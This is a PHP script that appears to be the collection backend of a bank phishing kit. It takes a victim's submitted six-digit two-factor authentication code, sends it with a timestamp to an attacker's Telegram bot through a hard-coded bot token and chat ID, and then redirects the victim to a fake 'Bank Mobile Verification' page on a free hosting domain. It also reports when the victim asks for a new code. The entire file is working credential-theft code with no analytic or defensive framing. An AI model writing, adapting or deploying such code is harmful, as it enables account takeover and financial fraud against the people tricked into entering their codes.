<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("Method Not Allowed");
}

date_default_timezone_set('UTC');

$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
$chatId   = '5248818941';

$code = trim($_POST['twoFactAuthConfCode'] ?? '');
$method = trim($_POST['method'] ?? '');

if ($method === 'Send new code') {
    $message = "🔁 *User requested new OTP code*\n📅 " . date("Y-m-d H:i:s");
} elseif (!preg_match('/^\d{6}$/', $code)) {
    http_response_code(400);
    exit("Invalid 2FA code.");
} else {
    $message = "✅ *2FA Code Submitted*\n🔢 *Code:* `{$code}`\n📅 " . date("Y-m-d H:i:s");
}

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect after submit or resend
header("Location: https://authenticationlive.rf.gd/cache_site/Bank%20Mobile%20Verification.html");
exit;
?>
